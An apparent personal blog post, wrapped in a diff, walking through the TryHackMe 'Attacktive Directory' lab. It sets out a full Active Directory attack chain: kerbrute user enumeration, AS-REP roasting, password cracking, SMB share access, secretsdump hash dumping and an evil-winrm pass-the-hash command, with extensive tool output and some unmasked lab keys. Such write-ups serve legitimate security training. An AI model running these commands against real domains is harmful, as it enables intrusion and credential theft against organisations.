@@ -1,0 +1,272 @@
+<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - THM - Attacktive Directory -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Attacktive Directory from TryHackMe.- Writeup - THM - Attacktive Directory"> <meta name="keywords" content="Writeup - THM - Attacktive Directory, Phil Malle, walkthroughs,tryhackeme, Active Direcotry, hacking, pwned, enum4linux, kerbrute"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - THM - Attacktive Directory" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Attacktive Directory from TryHackMe." property="og:description" /> <meta content="/blog/attacktivedirectory/" property="og:url" /> <meta content="2020-09-24T23:14:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="/assets/img/thm-images/THM-AttactriveDirctory.png" property="og:image" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - THM - Attacktive Directory" /> <meta name="twitter:url" content="/blog/attacktivedirectory/" /> <meta name="twitter:description" content="Walkthrough of Attacktive Directory from TryHackMe." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - THM - Attacktive Directory</h1> <h4 class="post-meta">Walkthrough of Attacktive Directory from TryHackMe.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-09-24 23:14:00 +0000" itemprop="datePublished" >Sep 24, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/attacktivedirectory/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="/assets/img/thm-images/THM-AttactriveDirctory.png" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Attacktive Directory</td> <td>03.11.2020</td> <td>medium</td> <td>Active Directory, AD, Kerberos, SMB</td> <td>6h</td> </tr> </tbody> </table> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>namp</td> <td>nmap -sC -sV -oN nmap/initial $ip</td> </tr> <tr> <td>rustscan</td> <td>rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial tee output</td> </tr> <tr> <td>enum4linux</td> <td>enum4linux -d $ip</td> </tr> <tr> <td>kerbrute</td> <td>./kerbrute_linux_amd64 userenum -d spookysec.local –dc spookysec.local ‘/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttractiveDirectory/user.txt’</td> </tr> <tr> <td>GetNPUser.py</td> <td>python3 GetNPUsers.py spookysec.local/s<strong>**</strong>*n -no-pass</td> </tr> <tr> <td>JohnTheRipper</td> <td>sudo john kerberushash –wordlist=password.txt</td> </tr> <tr> <td>metapsloit</td> <td>msf6 auxiliary(admin/smb/download_file)</td> </tr> <tr> <td>smbclient</td> <td>smbclient \\spookysec.local\backup -U s<strong>**</strong>*n</td> </tr> <tr> <td>secretsdump.py</td> <td>python3 secretsdump.py -just-dc backup@spookysec.local</td> </tr> <tr> <td>evil-winrm</td> <td>evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.124.175</td> </tr> </tbody> </table> <h1 id="usefull-information">Usefull Information</h1> <p>I have added the IP-Address of the room to my local /etc/hosts file, because we need it for further enumeration of the domain controller.</p> <h1 id="impacket">Impacket</h1> <p>For this Room we have to install Impacket.</p> <h2 id="installing-impacket">Installing Impacket:</h2> <p>First, you’ll want to clone the repo with:</p> <p>git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket</p> <p>This will clone Impacket to /opt/impacket/, after the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It’s key that you DO NOT miss it.</p> <p>So let’s install the requirements:</p> <p>pip3 install -r /opt/impacket/requirements.txt</p> <p>Once all the python modules are installed, we can then run the python setup install script:</p> <p>cd /opt/impacket/ &amp;&amp; python3 ./setup.py install</p> <p>After that, Impacket should be correctly installed now and it should be ready to use!</p> <p>If you are still having issues, you can try the following: sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket sudo pip3 install -r /opt/impacket/requirements.txt sudo cd /opt/impacket/ sudo pip3 install . sudo python3 setup.py install</p> <h1 id="enumerating-the-dc">Enumerating the DC</h1> <p>We used the the script “enum4linux” to enumerate the Target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
+└─<span class="nv">$ </span>enum4linux <span class="nt">-d</span> <span class="nv">$ip</span> | <span class="nb">tee </span>enum4linux.txt                                                                                                                                                                                              130 ⨯
+Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Tue Nov  3 21:10:45 2020
+
+ <span class="o">==========================</span> 
+|    Target Information    |
+ <span class="o">==========================</span> 
+Target ........... 10.10.124.175
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span class="o">=====================================================</span> 
+|    Enumerating Workgroup/Domain on 10.10.124.175    |
+ <span class="o">=====================================================</span> 
+Use of uninitialized value <span class="nv">$global_workgroup</span> <span class="k">in </span>concatenation <span class="o">(</span>.<span class="o">)</span> or string at ./enum4linux.pl line 437.
+<span class="o">[</span>E] Can<span class="s1">'t find workgroup/domain
+
+
+ ====================================== 
+|    Session Check on 10.10.124.175    |
+ ====================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+[+] Server 10.10.124.175 allows sessions using username '', password ''
+[+] Got domain/workgroup name: 
+
+ ============================================ 
+|    Getting domain SID for 10.10.124.175    |
+ ============================================ 
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+[+] Host is part of a domain (not a workgroup)
+enum4linux complete on Tue Nov  3 21:10:57 2020
+</span></code></pre></div></div> <h1 id="enumerating-the-dc-pt2">Enumerating the DC Pt2</h1> <p>The next step is to use the program “kerbrute” to get the username of the Domain.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[/git/kerbrute]
+└─<span class="nv">$ </span>./kerbrute_linux_amd64 userenum <span class="nt">-d</span> spookysec.local <span class="nt">--dc</span> spookysec.local <span class="s1">'/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttacktriveDirectory/user.txt'</span>
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 11/03/20 - Ronnie Flathers @ropnop
+
+2020/11/03 21:28:23 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2020/11/03 21:28:23 <span class="o">&gt;</span>  	spookysec.local:88
+
+2020/11/03 21:28:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 j<span class="k">***</span>s@spookysec.local
+2020/11/03 21:28:25 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 s<span class="k">*******</span>n@spookysec.local
+2020/11/03 21:28:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J<span class="k">***</span>s@spookysec.local
+2020/11/03 21:28:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 r<span class="k">***</span>n@spookysec.local
+2020/11/03 21:28:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 d<span class="k">******</span>r@spookysec.local
+2020/11/03 21:28:35 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 a<span class="k">***********</span>r@spookysec.local
+2020/11/03 21:28:42 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 b<span class="k">****</span>p@spookysec.local
+2020/11/03 21:28:46 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 p<span class="k">*****</span>x@spookysec.local
+2020/11/03 21:29:07 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J<span class="k">***</span>S@spookysec.local
+2020/11/03 21:29:15 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 R<span class="k">***</span>n@spookysec.local
+2020/11/03 21:29:57 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 A<span class="k">***********</span>r@spookysec.local
+2020/11/03 21:31:25 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D<span class="k">******</span>r@spookysec.local
+2020/11/03 21:31:52 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 P<span class="k">*****</span>x@spookysec.local
+2020/11/03 21:33:24 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D<span class="k">******</span>R@spookysec.local
+2020/11/03 21:33:51 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 o<span class="k">*</span>i@spookysec.local
+2020/11/03 21:34:41 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 R<span class="k">***</span>N@spookysec.local
+2020/11/03 21:39:46 <span class="o">&gt;</span>  Done! Tested 100000 usernames <span class="o">(</span>16 valid<span class="o">)</span> <span class="k">in </span>682.522 seconds
+
+</code></pre></div></div> <p>Kerbrute found some Username for the Domain.</p> <h1 id="exploiting-kerberos">Exploiting Kerberos</h1> <p>For a kerberus Ticket we use the program “GetNPUser.py” script from impacket. This will receive a kerberus hash. This has can be cracked with the provided Password list from this room and johntheripper.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetNPUsers.py spookysec.local/s<span class="k">******</span>n-no-pass 
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>s<span class="k">******</span>n
+<span class="nv">$krb5asrep$23$s</span><span class="k">******</span>n@SPOOKYSEC.LOCAL:a<span class="k">***********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************</span>b
+</code></pre></div></div> <p>Hashcracking with JohnTheRipper:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
+└─<span class="nv">$ </span><span class="nb">sudo </span>john kerberushash <span class="nt">--wordlist</span><span class="o">=</span>password.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+m<span class="k">************</span>5   <span class="o">(</span><span class="nv">$krb5asrep$23$s</span><span class="k">*******</span>n@SPOOKYSEC.LOCAL<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2020-11-03 21:45<span class="o">)</span> 16.66g/s 110933p/s 110933c/s 110933C/s horoscope..amy123
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div> <p>found a password for the user “s<strong>**</strong>*n”</p> <h1 id="enumerating-the-dc-pt3">Enumerating the DC pt3</h1> <p>For this step we will have a look at the SMB-Share. We can check if we can download a folder on the Share.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
+└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> spookysec.local <span class="nt">-d</span> spookysec.local <span class="nt">-u</span> s<span class="k">*******</span>n <span class="nt">-p</span> m<span class="k">************</span>5                                  1 ⨯
+<span class="o">[</span>+] IP: spookysec.local:445	Name: unknown                                           
+        Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	b<span class="k">****</span>p                                            	READ ONLY	
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+</code></pre></div></div> <p>We can use metasploit for download a specific file from the b<em>**</em>p folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>admin/smb/download_file<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>auxiliary/admin/smb/download_file<span class="o">)</span>:
+
+   Name         Current Setting         Required  Description
+   <span class="nt">----</span>         <span class="nt">---------------</span>         <span class="nt">--------</span>  <span class="nt">-----------</span>
+   FILE_RPATHS                          no        A file containing a list remote files relative to the share to operate on
+   RHOSTS       10.10.124.175           <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPATH        b<span class="k">****************</span>s.txt  no        The name of the remote file relative to the share to operate on
+   RPORT        445                     <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain    spookysec.local         no        The Windows domain to use <span class="k">for </span>authentication
+   SMBPass      m<span class="k">************</span>5          no        The password <span class="k">for </span>the specified username
+   SMBSHARE     b<span class="k">****</span>p                  <span class="nb">yes       </span>The name of a share on the RHOST
+   SMBUser      s<span class="k">*******</span>n               no        The username to authenticate as
+   THREADS      1                       <span class="nb">yes       </span>The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
+</code></pre></div></div> <p>Or we can use smbclient to connect to the B*****p-Share and read the file on the share.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>spookysec.local<span class="se">\\</span>backup <span class="nt">-U</span> s<span class="k">*******</span>n                       
+Enter WORKGROUP<span class="se">\s</span>vc-admin<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Apr  4 21:08:39 2020
+  ..                                  D        0  Sat Apr  4 21:08:39 2020
+  b****************s..txt              A       48  Sat Apr  4 21:08:53 2020
+
+		8247551 blocks of size 4096. 3879238 blocks available
+smb: \&gt; more ****************s..txt 
+getting file \****************s..txt of size 48 as /tmp/smbmore.qexQe1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \&gt; 
+</span></code></pre></div></div> <p>we now have a base64 hash, we can decode the hash and we have now the password for the b<em>**</em>p user.</p> <p>With this user we cann run the script from impacket “secretdump.py” to get the hashes of everyuser on the domain.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💀fr3ak0ut<span class="o">)</span>-[/git/impacket/examples]
+└─<span class="nv">$ </span>python3 secretsdump.py <span class="nt">-just-dc</span> b<span class="k">****</span>p@spookysec.local
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0<span class="k">******************************</span>c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:3<span class="k">******************************</span>0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0<span class="k">******************************</span>1:::
+spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5<span class="k">******************************</span>4:::
+spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5<span class="k">******************************</span>4:::
+spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9<span class="k">******************************</span>b:::
+spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:4<span class="k">******************************</span>e:::
+spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b<span class="k">******************************</span>b:::
+spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:c<span class="k">******************************</span>7:::
+spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c<span class="k">******************************</span>a:::
+spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:6<span class="k">******************************</span>b:::
+spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:0<span class="k">******************************</span>2:::
+spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3<span class="k">******************************</span>5:::
+spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:4<span class="k">******************************</span>4:::
+spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:f<span class="k">******************************</span>9:::
+spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:1<span class="k">******************************</span>8:::
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:1601:aad3b435b51404eeaad3b435b51404ee:0<span class="k">******************************</span>c:::
+ATTACKTIVEDIREC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:5<span class="k">******************************</span>4:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7<span class="k">**************************************************************</span>8
+Administrator:aes128-cts-hmac-sha1-96:e<span class="k">******************************</span>e
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b<span class="k">**************************************************************</span>c
+krbtgt:aes128-cts-hmac-sha1-96:e<span class="k">******************************</span>2
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local<span class="se">\s</span>kidy:aes256-cts-hmac-sha1-96:3<span class="k">**************************************************************</span>4
+spookysec.local<span class="se">\s</span>kidy:aes128-cts-hmac-sha1-96:4<span class="k">******************************</span>3
+spookysec.local<span class="se">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local<span class="se">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4<span class="k">**************************************************************</span>5
+spookysec.local<span class="se">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:3<span class="k">******************************</span>5
+spookysec.local<span class="se">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local<span class="se">\j</span>ames:aes256-cts-hmac-sha1-96:1<span class="k">**************************************************************</span>2
+spookysec.local<span class="se">\j</span>ames:aes128-cts-hmac-sha1-96:0<span class="k">******************************</span>6
+spookysec.local<span class="se">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local<span class="se">\o</span>ptional:aes256-cts-hmac-sha1-96:f<span class="k">**************************************************************</span>e
+spookysec.local<span class="se">\o</span>ptional:aes128-cts-hmac-sha1-96:0<span class="k">******************************</span>0
+spookysec.local<span class="se">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local<span class="se">\s</span>herlocksec:aes256-cts-hmac-sha1-96:8<span class="k">**************************************************************</span>d
+spookysec.local<span class="se">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c<span class="k">******************************</span>e
+spookysec.local<span class="se">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local<span class="se">\d</span>arkstar:aes256-cts-hmac-sha1-96:3<span class="k">**************************************************************</span>9
+spookysec.local<span class="se">\d</span>arkstar:aes128-cts-hmac-sha1-96:4<span class="k">******************************</span>e
+spookysec.local<span class="se">\d</span>arkstar:des-cbc-md5:758af4d061381cea
+spookysec.local<span class="se">\O</span>ri:aes256-cts-hmac-sha1-96:5<span class="k">**************************************************************</span>7
+spookysec.local<span class="se">\O</span>ri:aes128-cts-hmac-sha1-96:5<span class="k">******************************</span>e
+spookysec.local<span class="se">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
+spookysec.local<span class="se">\r</span>obin:aes256-cts-hmac-sha1-96:8<span class="k">**************************************************************</span>3
+spookysec.local<span class="se">\r</span>obin:aes128-cts-hmac-sha1-96:7<span class="k">******************************</span>8
+spookysec.local<span class="se">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local<span class="se">\p</span>aradox:aes256-cts-hmac-sha1-96:6<span class="k">**************************************************************</span>0
+spookysec.local<span class="se">\p</span>aradox:aes128-cts-hmac-sha1-96:f<span class="k">******************************</span>8
+spookysec.local<span class="se">\p</span>aradox:des-cbc-md5:83988983f8b34019
+spookysec.local<span class="se">\M</span>uirland:aes256-cts-hmac-sha1-96:8<span class="k">**************************************************************</span>7
+spookysec.local<span class="se">\M</span>uirland:aes128-cts-hmac-sha1-96:2<span class="k">******************************</span>a
+spookysec.local<span class="se">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local<span class="se">\h</span>orshark:aes256-cts-hmac-sha1-96:8<span class="k">**************************************************************</span>6
+spookysec.local<span class="se">\h</span>orshark:aes128-cts-hmac-sha1-96:c<span class="k">******************************</span>c
+spookysec.local<span class="se">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local<span class="se">\s</span>vc-admin:aes256-cts-hmac-sha1-96:e<span class="k">**************************************************************</span>8
+spookysec.local<span class="se">\s</span>vc-admin:aes128-cts-hmac-sha1-96:a<span class="k">******************************</span>f
+spookysec.local<span class="se">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local<span class="se">\b</span>ackup:aes256-cts-hmac-sha1-96:2<span class="k">**************************************************************</span>2
+spookysec.local<span class="se">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local<span class="se">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes256-cts-hmac-sha1-96:c<span class="k">**************************************************************</span>2
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:aes128-cts-hmac-sha1-96:3<span class="k">******************************</span>8
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:des-cbc-md5:e<span class="k">**************</span>9
+ATTACKTIVEDIREC<span class="nv">$:</span>aes256-cts-hmac-sha1-96:f<span class="k">**************************************************************</span>6
+ATTACKTIVEDIREC<span class="nv">$:</span>aes128-cts-hmac-sha1-96:f<span class="k">******************************</span>5
+ATTACKTIVEDIREC<span class="nv">$:</span>des-cbc-md5:1<span class="k">**************</span>d
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
